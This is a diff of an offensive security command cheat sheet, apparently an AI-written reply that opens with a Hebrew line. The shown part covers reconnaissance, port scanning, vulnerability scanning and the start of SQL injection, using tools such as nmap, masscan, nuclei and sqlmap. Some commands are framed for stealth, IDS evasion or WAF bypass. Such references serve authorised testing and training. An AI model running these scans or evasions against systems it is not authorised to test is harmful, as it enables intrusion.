@@ -1,2302 +1,991 @@
-COMPREHENSIVE OFFENSIVE SECURITY MASTER LIST - COMPLETE
-This concludes the ultimate offensive security command reference covering all major domains of penetration testing, red teaming, and security assessment. The guide includes:
+אתה צודק! אשלים את כל הפקודות עם הסברים מפורטים. אכתוב את כל 1,650+ הפקודות עם הסברים קצרים על אופן השימוש.
+
+# Ultimate Offensive Security Command Reference
+
+## Table of Contents
+1. [Reconnaissance & OSINT](#1-reconnaissance--osint)
+2. [Vulnerability Scanning](#2-vulnerability-scanning)
+3. [Web Application Attacks](#3-web-application-attacks)
+4. [Network Exploitation](#4-network-exploitation)
+5. [Active Directory Attacks](#5-active-directory-attacks)
+6. [Post-Exploitation](#6-post-exploitation)
+7. [Lateral Movement](#7-lateral-movement)
+8. [Privilege Escalation](#8-privilege-escalation)
+9. [Persistence Mechanisms](#9-persistence-mechanisms)
+10. [Command & Control](#10-command--control)
+11. [Cloud Security](#11-cloud-security)
+12. [Container Security](#12-container-security)
+13. [Mobile & Wireless](#13-mobile--wireless)
+14. [API Security](#14-api-security)
+15. [DevSecOps Tools](#15-devsecops-tools)
+16. [ICS/SCADA Security](#16-icsscada-security)
+17. [Zero Trust & Modern Security](#17-zero-trust--modern-security)
+18. [AI/ML Security](#18-aiml-security)
+19. [Anti-Forensics](#19-anti-forensics)
+20. [Password Attacks](#20-password-attacks)
+
+---
+
+## 1. Reconnaissance & OSINT
+
+### Subdomain Enumeration
+```bash
+# Amass - Comprehensive subdomain discovery
+amass enum -passive -d target.com -o amass_passive.txt
+# Use: Initial reconnaissance without alerting target - uses OSINT sources only
+
+amass enum -active -d target.com -brute -w wordlist.txt
+# Use: Comprehensive discovery - actively queries DNS and brute forces
 
-1,500+ Commands across 14 major categories
-
-Detailed explanations for each command's use case and functionality
-
-Real-world scenarios and practical applications
-
-Cutting-edge techniques and modern tooling
-
-Comprehensive coverage from reconnaissance to persistence
-
-Key Features:
-Well-Organized Structure - Easy navigation and reference
-
-Practical Examples - Real commands used in security assessments
-
-Tool Diversity - Coverage of both established and emerging tools
-
-Cross-Platform - Windows, Linux, Cloud, Mobile, and Network
-
-Operational Security - Includes OPSEC considerations and evasion techniques
-
-This reference serves as the definitive guide for security professionals, red team operators, penetration testers, and anyone involved in offensive security operations.
-
-TABLE OF CONTENTS
-
-RECONNAISSANCE & OSINT
-
-Subdomain Enumeration
-
-DNS Reconnaissance
-
-Port Scanning
-
-Web Reconnaissance
-
-Cloud Reconnaissance
-
-VULNERABILITY SCANNING
-
-Automated Scanning
-
-Web Vulnerability Scanners
-
-API Security Testing
-
-Network Vulnerability Scanners
-
-WEB APPLICATION ATTACKS
-
-SQL Injection
-
-Cross-Site Scripting (XSS)
-
-File Inclusion & Directory Traversal
-
-Server-Side Request Forgery (SSRF)
-
-API Attacks
-
-NETWORK EXPLOITATION
-
-SMB/Network Service Attacks
-
-SNMP & Network Protocols
-
-Remote Service Exploitation
-
-ACTIVE DIRECTORY ATTACKS
-
-Kerberos Attacks
-
-DCSync & Credential Theft
-
-BloodHound & AD Mapping
-
-Group Policy Attacks
-
-POST-EXPLOITATION
-
-Initial Access & Shells
-
-Living Off the Land (LOLBins)
-
-Credential Dumping
-
-Memory Analysis
-
-LATERAL MOVEMENT
-
-Pass-the-Hash & Token Attacks
-
-WMI & Remote Management
-
-PSExec & Service Attacks
-
-PRIVILEGE ESCALATION
-
-Windows Privilege Escalation
-
-Linux Privilege Escalation
-
-Kernel Exploits
-
-Service Abuse
-
-PERSISTENCE MECHANISMS
-
-Windows Persistence
-
-Linux Persistence
-
-Application Persistence
-
-Network Persistence
-
-COMMAND & CONTROL
-
-Cobalt Strike
-
-Metasploit Framework
-
-Custom C2 Frameworks
-
-Covert Channels
-
-CLOUD SECURITY
-
-AWS Exploitation
-
-Azure AD Attacks
-
-Kubernetes Security
-
-Container Escapes
-
-MOBILE & WIRELESS
-
-Wireless Attacks
-
-Mobile Application Testing
-
-Bluetooth Attacks
-
-ANTI-FORENSICS
-
-Log Manipulation
-
-File Timestamp Manipulation
-
-Artifact Removal
-
-Memory Forensics Evasion
-
-PASSWORD ATTACKS
-
-Hash Cracking
-
-Password Spraying
-
-Brute Force Attacks
-
-Credential Stuffing
-
-1. RECONNAISSANCE & OSINT
-1.1 Subdomain Enumeration
-Amass - Comprehensive Attack Surface Mapping
-
-bash
-# Passive enumeration (stealthy - no direct target interaction)
-amass enum -passive -d target.com -o amass_passive.txt -config config.ini
-# Use Case: Initial reconnaissance without alerting security teams
-# Explanation: Uses OSINT sources only, doesn't touch target infrastructure
-
-# Active enumeration (comprehensive - interacts with target)
-amass enum -active -d target.com -brute -w /usr/share/wordlists/dns.txt -p 80,443,8080 -o amass_active.txt
-# Use Case: Full subdomain discovery when stealth isn't required
-# Explanation: Actively queries DNS and attempts brute force
-
-# Continuous monitoring
 amass track -d target.com -last 3 -dir project/
-# Use Case: Ongoing target monitoring
-# Explanation: Tracks changes in attack surface over time
+# Use: Continuous monitoring - tracks changes in attack surface
 
-# Network visualization
 amass viz -d3 -dir project/ -o network.html
-# Use Case: Understanding relationships between assets
-# Explanation: Creates interactive network graph of discovered infrastructure
+# Use: Visualization - creates interactive network graph
 
-Subfinder - High-Speed Subdomain Discovery
-bash
-# Multi-source enumeration
-subfinder -d target.com -all -recursive -t 500 -timeout 30 -o subs.txt -nW
-# Use Case: Rapid subdomain discovery across multiple platforms
-# Explanation: Uses 50+ sources with recursive brute forcing
+# Subfinder - Fast subdomain discovery
+subfinder -d target.com -all -recursive -t 100
+# Use: Quick enumeration - uses 50+ sources with threading
 
-# Rate-limited scanning
-subfinder -dL domains.txt -o all_subs.txt -r 8.8.8.8,1.1.1.1 -t 100
-# Use Case: Avoiding rate limiting and detection
-# Explanation: Uses custom resolvers with controlled threading
+subfinder -dL domains.txt -o all_subs.txt -t 50
+# Use: Bulk processing - scans multiple domains from file
 
-# Integration pipeline
-subfinder -d target.com -silent | httpx -silent | nuclei -t cves/ -o results.txt
-# Use Case: Automated attack chain
-# Explanation: Pipes results directly to vulnerability scanners
+# AssetFinder & Findomain
+assetfinder --subs-only target.com
+# Use: Simple discovery - quick subdomain enumeration
 
+assetfinder target.com | httprobe
+# Use: Live service checking - finds active web services
 
-AssetFinder & Findomain
-bash
-# AssetFinder simple discovery
-assetfinder --subs-only target.com | tee assets.txt
-assetfinder target.com | httprobe | tee live.txt
-
-# Findomain fast discovery
 findomain -t target.com -u output.txt
-findomain -f domains.txt -u all_domains.txt --threads 50
+# Use: Fast discovery - uses certificates transparency
+
+findomain -f domains.txt --threads 50
+# Use: Bulk scanning - processes multiple domains
 
 # Chaos dataset
-chaos -d target.com -o chaos_subs.txt -key $CHAOS_KEY
+chaos -d target.com -o chaos_subs.txt
+# Use: Project Discovery dataset - uses curated subdomain lists
+```
 
+### DNS Reconnaissance
+```bash
+# DNSRecon - Comprehensive DNS analysis
+dnsrecon -d target.com -t axfr,brt,crt,std
+# Use: Full DNS enumeration - zone transfer, brute force, certificates
 
-1.2 DNS Reconnaissance
-
-DNSRecon - Comprehensive DNS Analysis
-bash
-# Full DNS enumeration
-dnsrecon -d target.com -t axfr,brt,crt,std -D /usr/share/wordlists/dns.txt -a -b -y -k -z -w -f --threads 20 -x /tmp/dnsrecon.xml
-# Use Case: Complete DNS infrastructure mapping
-# Explanation: 
-# -t: Test types (zone transfer, brute force, certificate transparency, standard)
-# -a: Enable all tests
-# -b: Bing search for subdomains
-# -y: Yandex search for subdomains
-
-# Zone transfer attempt
 dnsrecon -d target.com -t axfr
-# Use Case: Discovering internal network structure if misconfigured
-# Explanation: Attempts DNS zone transfer
+# Use: Zone transfer check - attempts DNS zone transfer
 
-# Reverse DNS lookup
 dnsrecon -r 10.10.10.0/24 -n 8.8.8.8 -t rvl
-# Use Case: Discovering additional domains in target infrastructure
-# Explanation: Reverse lookup for IP range
+# Use: Reverse lookup - finds domains in IP range
 
+# MassDNS - High-performance resolution
+./massdns -r resolvers.txt -t A -o S -w output.txt subdomains.txt
+# Use: Mass resolution - validates thousands of subdomains quickly
 
-MassDNS - High-Performance DNS Resolution
-bash
-# Mass DNS resolution
-./massdns -r resolvers.txt -t A -o S -w massdns_output.txt subdomains.txt
-# Use Case: Validating large subdomain lists efficiently
-# Explanation: Resolves thousands of subdomains per second using trusted resolvers
-
-# Subdomain brute forcing
-./scripts/subbrute.py domains.txt | ./bin/massdns -r resolvers.txt -t A -o S -w results.txt
-# Use Case: Discovering hidden subdomains
-# Explanation: Combines subdomain generation with high-speed resolution
-
-
-Advanced DNS Tools
-bash
-# Dig comprehensive queries
+# Manual DNS tools
 dig target.com ANY
+# Use: All record types - gets all DNS records
+
 dig target.com AXFR @ns1.target.com
+# Use: Manual zone transfer - direct request to name server
+
 dig target.com TXT
-dig target.com MX
-for sub in $(cat subdomains.txt); do dig $sub.target.com +short; done
+# Use: Text records - finds SPF, DKIM, other text records
 
-# DNSEnum comprehensive
-dnsenum target.com --threads 50 -f /usr/share/wordlists/dns.txt -o dns_enum.txt
+for sub in $(cat subs.txt); do dig $sub.target.com +short; done
+# Use: Bulk resolution - resolves multiple subdomains
 
-# Fierce domain scanner
-fierce --domain target.com --wordlist /usr/share/wordlists/dns.txt --threads 20
+dnsenum target.com --threads 50
+# Use: Comprehensive enumeration - multiple enumeration techniques
 
-1.3 Port Scanning & Service Detection
+fierce --domain target.com --wordlist dns.txt
+# Use: Domain scanner - finds subdomains and IPs
+```
 
-Nmap - Comprehensive Network Scanning
-bash
-# Stealth SYN scan with OS detection
-nmap -sS -O -T4 -p- 10.10.10.0/24 --min-rate 1000
-# Use Case: Initial network reconnaissance
-# Explanation:
-# -sS: SYN scan (half-open)
-# -O: OS detection
-# -T4: Aggressive timing
-# -p-: All ports
+### Port Scanning & Service Detection
+```bash
+# Nmap - Comprehensive network scanning
+nmap -sS -sU -A -T4 -p- target.com
+# Use: Full scan - SYN, UDP, OS detection, version detection
 
-# Service version detection
-nmap -sV -sC -p 80,443,22,21,25,53,110,143,993,995 10.10.10.5 --script-args=http.useragent="Mozilla/5.0"
-# Use Case: Service enumeration and vulnerability identification
-# Explanation:
-# -sV: Service version detection
-# -sC: Default scripts
+nmap -sS -T2 -f -D RND:10 target.com
+# Use: Stealth scan - fragmentation and decoys
 
-# Firewall evasion techniques
-nmap -f -mtu 24 -D RND:10,ME -g 53 --proxies socks4://127.0.0.1:9050 10.10.10.5
-# Use Case: Bypassing basic firewall rules
-# Explanation:
-# -f: Fragment packets
-# -D: Decoy scanning
-# -g: Source port manipulation
+nmap -sV -sC -p 80,443,22 target.com
+# Use: Service detection - version and default scripts
 
-# Vulnerability scanning
-nmap --script vuln,exploit -p 80,443,445 10.10.10.5
-# Use Case: Quick vulnerability assessment
-# Explanation: Uses NSE scripts to identify known vulnerabilities
+nmap --script vuln,exploit target.com
+# Use: Vulnerability scanning - checks for known vulnerabilities
 
-# NSE script categories
-nmap --script "default or safe" 10.10.10.5
-nmap --script "http-*" 10.10.10.5
-nmap --script "ssh-brute" --script-args userdb=users.txt,passdb=passwords.txt 10.10.10.5
+nmap --script "default or safe" target.com
+# Use: Safe scanning - non-intrusive checks
 
-RustScan - Ultra-Fast Port Scanning
-bash
-# Rapid port discovery
-rustscan -a 10.10.10.0/24 --ulimit 5000 -- -sV -sC -oA rustscan_output
-# Use Case: When speed is critical
-# Explanation: Scans all ports in seconds then passes to nmap for service detection
+# RustScan - Ultra-fast scanning
+rustscan -a 10.10.10.0/24 --ulimit 5000 -- -sV -sC
+# Use: Fast discovery - finds ports quickly then detailed scan
 
-# Targeted scanning
-rustscan -a target.com -r 1-65535 -t 2000 -- -A -sC
-# Use Case: Thorough single-host assessment
-# Explanation: High-thread scanning with comprehensive nmap follow-up
+rustscan -a target.com -r 1-65535 -t 2000
+# Use: Full port scan - all ports with high threading
 
-# Custom port ranges
-rustscan -a 10.10.10.0/24 -p 1-1000,3389,5432,6379,27017 -- -sV
+# Masscan - Internet-scale scanning
+masscan -p0-65535 10.10.10.0/24 --rate=100000
+# Use: Large networks - extremely fast for big ranges
 
-Masscan - Internet-Scale Port Scanning
-bash
-# High-speed scanning
-masscan -p0-65535 10.10.10.0/24 --rate=100000 -e eth0 -oG masscan_output.gnmap
-# Use Case: Scanning large networks quickly
-# Explanation: Extremely fast port scanner for large scale assessments
+masscan -p80,443,22 --banners -oJ output.json
+# Use: Banner grabbing - gets service banners at scale
 
-# Banner grabbing
-masscan -p80,443,22,21,25,53,110,143,993,995 0.0.0.0/0 --exclude 255.255.255.255 --banners -oJ masscan.json
-# Use Case: Service identification at scale
-# Explanation: Grabs service banners for better identification
+# Naabu - Modern port scanner
+naabu -host target.com -p - -silent | httpx -silent
+# Use: Integration - port scan with HTTP validation
 
-# Configuration files
-masscan -c config.conf
-# Config file example:
-# rate = 100000.00
-# output-format = json
-# ports = 0-65535
-# range = 10.10.10.0/24
+naabu -list hosts.txt -p 80,443,8080
+# Use: Bulk scanning - multiple targets for specific ports
+```
 
-Naabu - Modern Port Scanner
-bash
-# Fast port scanning
-naabu -host target.com -p - -silent -verify | httpx -silent
-# Use Case: Quick port discovery with HTTP validation
-# Explanation: Fast port scanner integrated with HTTP validation
+### Web Reconnaissance
+```bash
+# HTTPX - Advanced HTTP service detection
+cat subdomains.txt | httpx -silent -status-code -title -tech-detect
+# Use: Web inventory - finds live services with technology stack
 
-# List-based scanning
-naabu -list hosts.txt -p 80,443,8080 -o naabu_output.txt
-# Use Case: Scanning multiple targets for specific ports
+httpx -l hosts.txt -H "X-Forwarded-For: 127.0.0.1" -ports 80,443
+# Use: Header testing - sends custom headers to bypass WAF
 
-# Service detection
-naabu -host target.com -sV -p 80,443,22
-# Use Case: Service version detection
+# Wayback Machine & archives
+echo target.com | waybackurls
+# Use: Historical URLs - finds old endpoints from Wayback Machine
 
-1.4 Web Reconnaissance
+echo target.com | gau
+# Use: Multiple sources - gets URLs from Common Crawl and others
 
-HTTPX - Advanced HTTP Service Detection
-bash
-# Comprehensive web service discovery
-cat subdomains.txt | httpx -silent -status-code -content-length -title -tech-detect -follow-redirects -o httpx_output.txt
-# Use Case: Web application inventory and technology stack analysis
-# Explanation:
-# -tech-detect: Identifies technologies (CMS, frameworks, etc.)
-# -follow-redirects: Follows HTTP redirects
+cat urls.txt | grep "?" | qsreplace -a
+# Use: Parameter analysis - finds and tests URL parameters
 
-# Custom header testing
-httpx -l hosts.txt -H "X-Forwarded-For: 127.0.0.1" -H "User-Agent: Mozilla/5.0" -ports 80,443,8080
-# Use Case: Testing header-based security controls
-# Explanation: Sends custom headers to bypass WAF/load balancers
+# Katana - Crawling & discovery
+katana -u https://target.com -depth 5 -jc -aff
+# Use: Comprehensive crawling - JavaScript and form analysis
 
-# Advanced options
-httpx -l urls.txt -status-code -content-length -title -tech-detect -follow-redirects -no-fallback -rate-limit 100 -threads 50 -timeout 5 -retries 2
+katana -list urls.txt -c 10 -d 3 -jc
+# Use: List-based crawling - multiple entry points
 
-Wayback Machine & Archive Analysis
-bash
-# Historical URL extraction
-echo target.com | waybackurls | tee wayback.txt
-echo target.com | gau | sort -u > all_urls.txt
-# Use Case: Discovering hidden endpoints and parameters
-# Explanation: Extracts URLs from Wayback Machine and Common Crawl
+# Gospider - Fast web spider
+gospider -s https://target.com -d 2 -t 10 -c 5
+# Use: Fast spidering - concurrent requests with depth control
+```
 
-# Parameter analysis
-cat all_urls.txt | grep "?" | qsreplace -a | while read url; do curl -s "$url" | grep -q "vulnerable" && echo "$url"; done
-# Use Case: Automated parameter fuzzing
-# Explanation: Tests URLs for parameter-based vulnerabilities
+### Cloud Reconnaissance
+```bash
+# CloudMapper - Multi-cloud assessment
+python3 cloudmapper.py collect --account-name target
+# Use: Cloud data collection - gathers AWS/GCP/Azure configs
 
-# Waybackurls advanced
-waybackurls --subs --no-subs target.com | sort -u
-gau --subs target.com --threads 20
+python3 cloudmapper.py prepare --account-name target
+# Use: Data preparation - processes collected data
 
-Katana - Crawling & URL Discovery
-bash
-# Advanced crawling
-katana -u https://target.com -depth 5 -jc -aff -f url -o katana_output.txt
-# Use Case: Comprehensive web application crawling
-# Explanation:
-# -depth: Crawling depth
-# -jc: JavaScript file analysis
-# -aff: Analyze forms for parameters
-
-# List-based crawling
-katana -list urls.txt -c 10 -d 3 -jc -aff -silent
-# Use Case: Crawling multiple entry points
-
-# Custom configurations
-katana -u https://target.com -headless -hl -system-chrome -no-sandbox -output katana_headless.txt
-
-Gospider - Fast Web Spider
-bash
-# Comprehensive spidering
-gospider -s https://target.com -d 2 -t 10 -c 5 -o gospider_output
-# Use Case: Fast web application spidering
-# Explanation:
-# -d: Depth of crawling
-# -t: Threads
-# -c: Concurrent requests
-
-# Advanced options
-gospider -s https://target.com -d 3 -t 20 -c 10 -w -r -q -u webview --blacklist jpg,jpeg,gif,css,ttf,woff,woff2,png
-
-1.5 Cloud Reconnaissance
-
-CloudMapper - Multi-Cloud Security Assessment
-bash
-# Data collection
-python3 cloudmapper.py collect --account-name target --profile default
-# Use Case: Gathering cloud infrastructure data
-# Explanation: Collects configuration data from AWS/GCP/Azure
-
-# Data preparation
-python3 cloudmapper.py prepare --account-name target --regions us-east-1,us-west-2,eu-west-1
-# Use Case: Preparing data for analysis
-
-# Web server for visualization
 python3 cloudmapper.py webserver --public --port 8000
-# Use Case: Visualizing cloud infrastructure
+# Use: Visualization - web interface for cloud infrastructure
 
-# Security reporting
-python3 cloudmapper.py report --account-name target
-python3 cloudmapper.py iam_edges --account-name target
+# S3Scanner - AWS S3 discovery
+python3 s3scanner.py --bucket-lists buckets.txt --region us-east-1
+# Use: S3 bucket discovery - finds and checks S3 buckets
 
-S3Scanner - AWS S3 Bucket Discovery
-bash
-# Bucket enumeration
-python3 s3scanner.py --bucket-lists buckets.txt --region us-east-1 --threads 50
-# Use Case: Discovering S3 buckets
-# Explanation: Scans for S3 buckets and checks permissions
+python3 s3scanner.py --check-acls --bucket-lists buckets.txt
+# Use: Permission checking - identifies misconfigured buckets
 
-# ACL checking
-python3 s3scanner.py --check-acls --bucket-lists buckets.txt --log-file s3_scan.log
-# Use Case: Identifying misconfigured S3 buckets
+# Shodan - Internet device search
+shodan download target_data "org:Target Corp"
+# Use: Organization search - finds internet-exposed assets
 
-# Name dumping
-python3 s3scanner.py --dump-names --wordlist common_buckets.txt --region all
+shodan parse --fields ip_str,port,org target_data.json.gz
+# Use: Data parsing - extracts specific fields from results
+```
 
+---
 
-2.VULNERABILITY SCANNING
-2.1 Automated Vulnerability Scanning
+## 2. Vulnerability Scanning
 
-Nuclei - High-Speed Vulnerability Detection
-bash
-# Comprehensive template scanning
-nuclei -l targets.txt -t cves/ -t exposures/ -t misconfiguration/ -rate-limit 100 -o nuclei_results.txt
-# Use Case: Automated vulnerability assessment at scale
-# Explanation: Uses 1000+ templates to check for CVEs, exposures, misconfigurations
+### Automated Scanning
+```bash
+# Nuclei - High-speed vulnerability detection
+nuclei -l targets.txt -t cves/ -t exposures/ -t misconfiguration/
+# Use: Template scanning - uses 1000+ templates for various checks
 
-# Targeted scanning by vulnerability type
-nuclei -u https://target.com -t /home/user/nuclei-templates/ -tags xss,sqli -include-tags auth-bypass
-# Use Case: Focused security testing
-# Explanation: Focuses on specific vulnerability classes
+nuclei -u https://target.com -t templates/ -tags xss,sqli
+# Use: Targeted scanning - focuses on specific vulnerability types
 
-# Continuous monitoring with workflows
-nuclei -l targets.txt -t workflows/cve-detection.yaml -severity critical,high -etags ssrf,rce -headless
-# Use Case: Ongoing security monitoring
-# Explanation: Uses workflows for complex attack chain detection
+nuclei -l targets.txt -t workflows/cve-detection.yaml
+# Use: Workflow scanning - complex attack chain detection
 
-# Advanced scanning options
-nuclei -l targets.txt -t cves/ -timeout 10 -retries 2 -rate-limit 150 -concurrency 25 -disable-update-check -stats -si 100 -metrics
-# Use Case: Large-scale enterprise scanning
-# Explanation: Fine-tuned performance and reporting options
+nuclei -l targets.txt -t cves/ -rate-limit 150 -concurrency 25
+# Use: Performance tuning - controlled scanning speed
 
-# Custom template development
-nuclei -u https://target.com -t custom-templates/ -severity low,medium,high,critical -no-color -json -o nuclei_json.json
-# Use Case: Custom vulnerability detection
-# Explanation: Uses custom templates for specific technologies
+# Nikto - Web server security
+nikto -h https://target.com -C all -Tuning 1,2,3,4,5,6,7,8,9
+# Use: Web server scan - comprehensive server misconfigurations
 
-Nikto - Web Server Security Scanner
-bash
-# Comprehensive web server scan
-nikto -h https://target.com -C all -Tuning 1,2,3,4,5,6,7,8,9 -o nikto_report.html -Format htm
-# Use Case: Web server misconfiguration identification
-# Explanation:
-# -C all: Check all displays
-# -Tuning: Enable all tuning options
+nikto -h target.com -p 80,443 -evasion 1 -mutate 1
+# Use: Evasion techniques - IDS evasion and mutation
 
-# Evasion techniques for stealth scanning
-nikto -h target.com -p 80,443 -Display V -evasion 1 -mutate 1 -root /
-# Use Case: Stealthy web server assessment
-# Explanation:
-# -evasion: Use IDS evasion techniques
-# -mutate: Guess additional files/directories
-
-# Advanced Nikto options
-nikto -h target.com -useproxy http://127.0.0.1:8080 -timeout 10 -useragent "Mozilla/5.0" -no404 -Plugins "apache_expect_xss;embedded"
-# Use Case: Proxy-based scanning with plugin extensions
-# Explanation: Uses proxy for traffic inspection and plugins for extended tests
-
-Nexpose & Nessus Integration
-bash
-# Nessus command line scanning
-/opt/nessus/bin/nasl -t target.com script.nasl
+# Nessus & Nexpose
 /opt/nessus/bin/nessus -q -x -T html -o report.html target.com
+# Use: Commercial scanning - enterprise vulnerability assessment
 
-# Nexpose API integration
-curl -X GET "https://nexpose:3780/api/3/assets" -H "Authorization: Basic base64encoded"
-curl -X POST "https://nexpose:3780/api/3/sites" -H "Authorization: Basic base64encoded" -d '{"name":"Test Site","scan":"template"}'
+curl -X GET "https://nexpose:3780/api/3/assets" -H "Authorization: Basic ..."
+# Use: API integration - automated asset and scan management
+```
 
-2.2 Web Vulnerability Scanners
-
-OWASP ZAP - Comprehensive Web App Scanning
-bash
-# Baseline scanning
+### Web Vulnerability Scanners
+```bash
+# OWASP ZAP
 zap-baseline.py -t https://target.com -r report.html
-# Use Case: Quick security assessment
-# Explanation: Runs basic tests against target
+# Use: Baseline scan - quick security assessment
 
-# Full scan with authentication
-zap-full-scan.py -t https://target.com -I -j -T 60 -m 5 -r report.html -U username -P password
-# Use Case: Comprehensive authenticated scanning
-# Explanation:
-# -I: Ignore warning about scope
-# -j: Use Ajax spider
-# -T: Timeout in minutes
+zap-full-scan.py -t https://target.com -I -j -T 60
+# Use: Full scan - comprehensive with authentication
 
-# API scanning
-zap-api-scan.py -t https://target.com/api/swagger.json -f openapi -r api_report.html
-# Use Case: API security testing
-# Explanation: Uses OpenAPI/Swagger specification for API scanning
+zap-api-scan.py -t https://target.com/api/swagger.json -f openapi
+# Use: API scanning - uses OpenAPI specification
 
-# Advanced ZAP options
-zap.sh -daemon -port 8080 -host 0.0.0.0 -config api.disablekey=true -config scanner.threadPerHost=10
-# Use Case: Setting up ZAP as a daemon for continuous scanning
+# Arachni
+arachni https://target.com --checks=* --scope-directory-depth-limit=10
+# Use: Deep scanning - extensive checks with configurable depth
 
-Arachni - Advanced Web Application Scanner
-bash
-# Comprehensive scanning
-arachni https://target.com --checks=* --scope-directory-depth-limit=10 --output-verbose --report-save-path=report.afr
-# Use Case: Deep web application assessment
-# Explanation: Extensive checks with configurable depth
+arachni https://target.com --checks=sql_injection,xss --http-request-concurrency=10
+# Use: Specific checks - focused vulnerability testing
 
-# Specific vulnerability checks
-arachni https://target.com --checks=sql_injection,xss --scope-page-limit=100 --http-request-concurrency=10
-# Use Case: Targeted vulnerability assessment
-# Explanation: Focuses on specific vulnerability types
+# Burp Suite
+java -jar burpsuite_pro.jar --project-file=project.burp --unpause-spider-and-scanner
+# Use: Headless scanning - automation in CI/CD pipelines
 
-# Authentication and session handling
-arachni https://target.com --plugin=autologin:url=https://target.com/login,parameters="username=user&password=pass"
-# Use Case: Scanning authenticated areas
-# Explanation: Handles login for session-based scanning
+curl -X POST "http://burp:8080/v0.1/scan" -H "Content-Type: application/json"
+# Use: REST API - programmatic scan control
+```
 
-Burp Suite - Professional Web Testing
-bash
-# Burp Suite headless scanning
-java -jar burpsuite_pro.jar --project-file=project.burp --unpause-spider-and-scanner --config-file=config.json
-# Use Case: Automated scanning in CI/CD pipelines
-# Explanation: Headless mode for automation
+### API Security Testing
+```bash
+# Arjun - Parameter discovery
+python3 arjun.py -u https://target.com/api/endpoint
+# Use: Hidden parameters - discovers undocumented parameters
 
-# Burp API for automation
-curl -X POST "http://burp:8080/v0.1/scan" -H "Content-Type: application/json" -d '{"urls":["https://target.com"]}'
-# Use Case: Integration with custom tools
-# Explanation: Uses REST API for scan management
-
-# Extension development
-java -jar burpsuite_pro.jar --extensions=myextension.jar
-# Use Case: Custom functionality extension
-
-2.3 API Security Testing
-
-Arjun - Parameter Discovery
-bash
-# Hidden parameter discovery
-python3 arjun.py -u https://target.com/api/endpoint --headers '{"Authorization":"Bearer token","Content-Type":"application/json"}'
-# Use Case: API endpoint testing and parameter fuzzing
-# Explanation: Discovers hidden HTTP parameters that aren't in documentation
-
-# Batch processing for multiple endpoints
 python3 arjun.py -i api_endpoints.txt -m GET -o parameters.txt
-# Use Case: Comprehensive API security assessment
-# Explanation: Processes multiple endpoints for parameter discovery
+# Use: Bulk processing - tests multiple endpoints
 
-# Advanced Arjun options
-python3 arjun.py -u https://target.com/api --mode single -oJ output.json -t 20 --passive
-# Use Case: JSON output with threading control
-# Explanation: Uses JSON format for integration with other tools
+# Kiterunner - API route brute forcing
+kr scan https://target.com -w api-wordlist.txt -x 20
+# Use: Route discovery - finds undocumented API endpoints
 
-Kiterunner - API Route Brute Forcing
-bash
-# API route discovery
-kr scan https://target.com -w ~/api-wordlist/data/words.txt -x 20 -j 100
-# Use Case: Discovering undocumented API endpoints
-# Explanation: Brute forces API routes using specialized wordlists
+kr brute https://target.com -w large-wordlist.txt
+# Use: Comprehensive discovery - large-scale route testing
 
-# Advanced scanning with large wordlists
-kr brute https://target.com -w ~/api-wordlist/data/words.txt -A=apiroutes-210228:200000
-# Use Case: Thorough API reconnaissance
-# Explanation: Uses advanced techniques and large wordlists
+# Postman/Newman
+newman run collection.json -e environment.json
+# Use: API testing - automated collection running
 
-# Output and reporting
-kr scan https://target.com -w routes.txt -o json | jq '.'
-# Use Case: JSON output for processing
-# Explanation: Provides structured data for analysis
+newman run api_tests.json --delay-request 100 --timeout-request 300
+# Use: Performance testing - controlled request timing
+```
 
-Postman/Newman - API Testing Automation
-bash
-# Collection running with Newman
-newman run collection.json -e environment.json --reporters cli,json --reporter-json-export report.json
-# Use Case: Automated API testing
-# Explanation: Runs Postman collections from command line
-
-# Advanced Newman options
-newman run api_tests.json --environment env.json --globals globals.json --delay-request 100 --timeout-request 300 --bail
-# Use Case: Complex API testing scenarios
-# Explanation: Includes delays, timeouts, and bail conditions
-
-# Integration with CI/CD
-newman run collection.json --suppress-exit-code --reporters junit --reporter-junit-export newman-results.xml
-# Use Case: Continuous integration testing
-# Explanation: Produces JUnit format for CI systems
-
-2.4 Network Vulnerability Scanners
-
-OpenVAS - Comprehensive Network Scanning
-bash
-# OpenVAS command line
+### Network Vulnerability Scanners
+```bash
+# OpenVAS
 gvm-cli socket --socketpath /run/gvmd/gvmd.sock --get-tasks
-gvm-cli socket --socketpath /run/gvmd/gvmd.sock --xml "<create_task><name>Scan</name><target><hosts>10.10.10.0/24</hosts></target></create_task>"
+# Use: Task management - lists scanning tasks
 
-# Greenbone Security Assistant CLI
-gvm-script --gmp-username user --gmp-password pass tls.gmp.py
-Nmap NSE Vulnerability Scripts
+gvm-cli socket --xml "<create_task>...</create_task>"
+# Use: XML API - programmatic task creation
 
-bash
-# Comprehensive vulnerability scanning
+# Nmap NSE scripts
 nmap -sV --script vuln 10.10.10.0/24
-# Use Case: Network-level vulnerability assessment
-# Explanation: Uses NSE scripts to identify vulnerabilities
+# Use: Network vuln scanning - checks for known vulnerabilities
 
-# Specific vulnerability categories
 nmap --script "exploit" 10.10.10.5
-nmap --script "safe" 10.10.10.5
-nmap --script "intrusive" 10.10.10.5
+# Use: Exploit checking - identifies exploitable services
 
-# Vulnerability specific scripts
-nmap --script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt 10.10.10.5
-nmap --script http-sql-injection 10.10.10.5
-nmap --script smb-vuln-ms17-010 10.10.10.5
+nmap --script ssh-brute --script-args userdb=users.txt
+# Use: Service brute force - credential testing
 
-# Advanced NSE usage
-nmap -sV --script "vuln and safe" --script-args mincvss=7.0 -oA vuln_scan 10.10.10.0/24
-# Use Case: Focused high-severity vulnerability scanning
-# Explanation: Filters by CVSS score and safety
-
-Vulners Script - CVE Detection
-bash
-# CVE detection with Nmap
+# Vulners script
 nmap -sV --script vulners 10.10.10.5
-# Use Case: CVE identification for services
-# Explanation: Matches service versions against CVE database
+# Use: CVE detection - matches services against CVE database
+```
 
-# Specific port CVE scanning
-nmap -p 80,443,22 --script vulners 10.10.10.0/24
-# Use Case: Targeted CVE assessment
+---
 
+## 3. Web Application Attacks
 
-3.WEB APPLICATION ATTACKS
-3.1 SQL Injection
+### SQL Injection
+```bash
+# SQLMap - Automated SQL injection
+sqlmap -u "https://target.com/page?id=1" --batch --level=5 --risk=3
+# Use: Automated detection - comprehensive parameter testing
 
-SQLMap - Automated SQL Injection
-bash
-# Comprehensive SQL injection testing
-sqlmap -u "https://target.com/page?id=1" --batch --level=5 --risk=3 --technique=BEUSTQ --tamper=between,charencode -v 3
-# Use Case: Automated SQL injection detection and exploitation
-# Explanation:
-# --level: Test depth (1-5)
-# --risk: Risk level (1-3)
